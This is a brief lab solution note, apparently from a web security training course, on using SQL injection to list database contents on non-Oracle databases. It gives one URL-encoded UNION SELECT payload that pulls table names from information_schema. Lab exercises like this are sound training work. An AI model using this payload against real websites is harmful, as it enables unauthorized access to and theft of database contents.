# Lab: SQL injection attack, listing the database contents on non-Oracle databases

## Objective
Perform the attack to solve SQL injection attack, listing the database contents on non-Oracle databases.

## Payload
```text
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```
